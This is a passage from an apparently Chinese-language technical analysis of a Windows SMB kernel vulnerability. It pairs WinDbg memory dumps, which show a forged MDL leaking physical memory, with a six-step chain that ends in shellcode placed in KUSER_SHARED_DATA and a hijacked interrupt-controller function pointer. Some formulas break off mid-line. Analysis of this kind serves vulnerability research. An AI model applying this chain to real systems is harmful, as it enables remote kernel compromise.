    fffff800`44d25529 488b5818        mov     rbx,qword ptr [rax+18h]
    3: kd> dd rax    //被破坏了的pmdl1指针
    ffffae8d`0cfce150  00000000 00000000 005c0073 00750050
    ffffae8d`0cfce160  00000002 00000003 0cfcd050 ffffae8d
    ffffae8d`0cfce170  00001100 000000c4 00001278 00650076
    ffffae8d`0cfce180  0cfcd000 ffffae8d 00000e00 fffff780
    ffffae8d`0cfce190  00000000 006f0052 00000000 00000000
    ffffae8d`0cfce1a0  0cfce228 ffffae8d 00000000 00000000
    ffffae8d`0cfce1b0  00000000 00450054 0050004d 0043003d
    ffffae8d`0cfce1c0  005c003a 00730055 00720065 005c0073
在后续数据传输过程中会调用hal!HalBuildScatterGatherListV2函数，其会利用MDL结构中的PFN、ByteOffset以及ByteCount来设置_SCATTER_GATHER_ELEMENT结构。然后调用TRANSMIT::MiniportProcessSGList函数（位于e1i65x64.sys，网卡驱动，测试环境）直接传送数据，该函数第三个参数为_SCATTER_GATHER_LIST类型，其两个
_SCATTER_GATHER_ELEMENT结构分别指明了0x3d942c0 和 0x1aa008
（物理地址），如下所示，当函数执行完成后，0x1aa物理页的部分数据被泄露。其中，0x1aa008来自于伪造的MDL结构，计算过程为：(0x1aa  dd r8
    ffffae8d`0b454ca0  00000002 ffffae8d 00000001 00000000
    ffffae8d`0b454cb0  03d942c0 00000000 00000100 ffffae8d
    ffffae8d`0b454cc0  00000000 00000260 001aa008 00000000
    ffffae8d`0b454cd0  00000206 00000000 00640064 00730069
    1: kd> dt _SCATTER_GATHER_LIST @r8
    hal!_SCATTER_GATHER_LIST
       +0x000 NumberOfElements : 2
       +0x008 Reserved         : 1
       +0x010 Elements         : [0] _SCATTER_GATHER_ELEMENT
    1: kd> dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0
    hal!_SCATTER_GATHER_ELEMENT
       +0x000 Address          : _LARGE_INTEGER 0x3d942c0
       +0x008 Length           : 0x100
       +0x010 Reserved         : 0x00000260`00000000
    1: kd> dt _SCATTER_GATHER_ELEMENT ffffae8d`0b454cb0+18
    hal!_SCATTER_GATHER_ELEMENT
       +0x000 Address          : _LARGE_INTEGER 0x1aa008
       +0x008 Length           : 0x206
       +0x010 Reserved         : 0x00730069`00640064
    1: kd> !db 0x3d9438a l100
    # 3d9438a 00 50 56 c0 00 08 00 0c-29 c9 e3 5d 08 00 45 00 .PV.....)..]..E.
    # 3d9439a 02 2e 45 8c 00 00 80 06-00 00 c0 a8 8c 8a c0 a8 ..E.............
    # 3d943aa 8c 01 01 bd df c4 e1 1c-22 7e c3 d1 b7 0d 50 18 ........"~....P.
    # 3d943ba 20 14 9b fd 00 00 c3 d1-b7 0d 00 00 00 00 00 00  ...............
    1: kd> !dd 0x1aa008
    #  1aa008 00000000 00000000 00000000 00000000
    #  1aa018 00000000 00000000 00000000 00000000
    #  1aa028 00000000 00000000 00000000 00000000
    #  1aa038 00000000 00000000 00000000 00000000
    #  1aa048 00000000 00000000 00000000 00000000
    #  1aa058 00000000 00000000 00000000 00000000
    #  1aa068 00000000 00000000 00000000 00000000
    #  1aa078 00000000 00000000 00000000 00000000
正常的响应包应该是以下这个样子的，这次通过查看MiniportProcessSGList函数第四个参数（_NET_BUFFER类型）来验证，如下所示，此次MDL结构中维护的物理地址（0x4a84704c）和线性地址（0xffffae8d0cfe304c）是一致的：
    3: kd> dt _NET_BUFFER @r9
    ndis!_NET_BUFFER
       +0x000 Next             : (null) 
       +0x008 CurrentMdl       : 0xffffae8d`0ca6ac50 _MDL
       +0x010 CurrentMdlOffset : 0xca
       +0x018 DataLength       : 0x23c
       +0x018 stDataLength     : 0x00010251`0000023c
       +0x020 MdlChain         : 0xffffae8d`0ca6ac50 _MDL
       +0x028 DataOffset       : 0xca
       +0x000 Link             : _SLIST_HEADER
       +0x000 NetBufferHeader  : _NET_BUFFER_HEADER
       +0x030 ChecksumBias     : 0
       +0x032 Reserved         : 5
       +0x038 NdisPoolHandle   : 0xffffae8d`08304900 Void
       +0x040 NdisReserved     : [2] 0xffffae8d`0c2e19a0 Void
       +0x050 ProtocolReserved : [6] 0x00000206`00000100 Void
       +0x080 MiniportReserved : [4] (null) 
       +0x0a0 DataPhysicalAddress : _LARGE_INTEGER 0xff0201cb`ff0201cd
       +0x0a8 SharedMemoryInfo : (null) 
       +0x0a8 ScatterGatherList : (null) 
    3: kd> dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0ca6ac50)
    ((ndis!_MDL *)0xffffae8d0ca6ac50)                 : 0xffffae8d0ca6ac50 [Type: _MDL *]
        [+0x000] Next             : 0xffffae8d0850d690 [Type: _MDL *]
        [+0x008] Size             : 56 [Type: short]
        [+0x00a] MdlFlags         : 4 [Type: short]
        [+0x00c] AllocationProcessorNumber : 0x2e7 [Type: unsigned short]
        [+0x00e] Reserved         : 0xff02 [Type: unsigned short]
        [+0x010] Process          : 0x0 [Type: _EPROCESS *]
        [+0x018] MappedSystemVa   : 0xffffae8d0ca6ac90 [Type: void *]
        [+0x020] StartVa          : 0xffffae8d0ca6a000 [Type: void *]
        [+0x028] ByteCount        : 0x100 [Type: unsigned long]
        [+0x02c] ByteOffset       : 0xc90 [Type: unsigned long]
    3: kd> dx -id 0,0,ffffae8d05473040 -r1 ((ndis!_MDL *)0xffffae8d0850d690)
    ((ndis!_MDL *)0xffffae8d0850d690)                 : 0xffffae8d0850d690 [Type: _MDL *]
        [+0x000] Next             : 0x0 [Type: _MDL *]
        [+0x008] Size             : 56 [Type: short]
        [+0x00a] MdlFlags         : 16412 [Type: short]
        [+0x00c] AllocationProcessorNumber : 0x3 [Type: unsigned short]
        [+0x00e] Reserved         : 0x0 [Type: unsigned short]
        [+0x010] Process          : 0x0 [Type: _EPROCESS *]
        [+0x018] MappedSystemVa   : 0xffffae8d0cfe304c [Type: void *]
        [+0x020] StartVa          : 0xffffae8d0cfe3000 [Type: void *]
        [+0x028] ByteCount        : 0x206 [Type: unsigned long]
        [+0x02c] ByteOffset       : 0x4c [Type: unsigned long]
    3: kd> db 0xffffae8d0cfe304c
    ffffae8d`0cfe304c  00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00  .....SMB@.......
    ffffae8d`0cfe305c  00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffae8d`0cfe306c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffae8d`0cfe307c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffae8d`0cfe308c  00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05  ....A.......f4..
    ffffae8d`0cfe309c  30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00  0..I.H.xG..8/...
    ffffae8d`0cfe30ac  00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89  .............k..
    ffffae8d`0cfe30bc  4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01  K.............@.
    3: kd> !db 0x4a84704c
    #4a84704c 00 00 02 02 fe 53 4d 42-40 00 00 00 00 00 00 00 .....SMB@.......
    #4a84705c 00 00 01 00 01 00 00 00-00 00 00 00 00 00 00 00 ................
    #4a84706c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
    #4a84707c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
    #4a84708c 00 00 00 00 41 00 01 00-11 03 02 00 66 34 fa 05 ....A.......f4..
    #4a84709c 30 97 9d 49 88 48 f5 78-47 ea 04 38 2f 00 00 00 0..I.H.xG..8/...
    #4a8470ac 00 00 80 00 00 00 80 00-00 00 80 00 02 6b 83 89 .............k..
    #4a8470bc 4b 8b d6 01 00 00 00 00-00 00 00 00 80 00 40 01 K.............@.
### 漏洞利用流程
1.通过任意地址写伪造MDL结构
2.利用解压缩精准覆盖pMDL1指针，使得压缩数据正好可以解压出伪造的MDL结构地址，但要控制解压失败，避免不必要的后续复制操作覆盖掉重要数据
3.利用前两步读取1aa（1ad）页，寻找自索引值，根据这个值计算PTE base
4.根据PTE BASE和KUSER_SHARED_DATA的虚拟地址计算出该地址的PTE，修改KUSER_SHARED_DATA区域的可执行权限
5.将Shellcode通过任意地址写复制到0xfffff78000000800（属于KUSER_SHARED_DATA）
6.获取halpInterruptController指针以及hal!HalpApicRequestInterrupt指针，利用任意地址写将hal!HalpApicRequestInterrupt指针覆盖为Shellcode地址，将halpInterruptController指针复制到已知区域（以便Shellcode可以找到hal!HalpApicRequestInterrupt函数地址并将halpInterruptController偏移0x78处的该函数指针还原）。hal!HalpApicRequestInterrupt函数是系统一直会调用的函数，劫持了它就等于劫持了系统执行流程。
**计算 PTE BASE：** 使用物理地址读泄露1aa页的数据（测试虚拟机采用BIOS引导），找到其自索引，通过(index  !dq 1aa000 l1df+1
    #  1aa000 8a000000`0de64867 00000000`00000000
    #  1aa010 00000000`00000000 00000000`00000000
    #  1aa020 00000000`00000000 00000000`00000000
    #  ......
    #  1aaed0 0a000000`013b3863 00000000`00000000
    #  1aaee0 00000000`00000000 00000000`00000000
    #  1aaef0 00000000`00000000 80000000`001aa063
    1: kd> ?(0x1DF  u MiGetPteAddress
    nt!MiGetPteAddress:
    fffff802`045add28 48c1e909        shr     rcx,9
    fffff802`045add2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h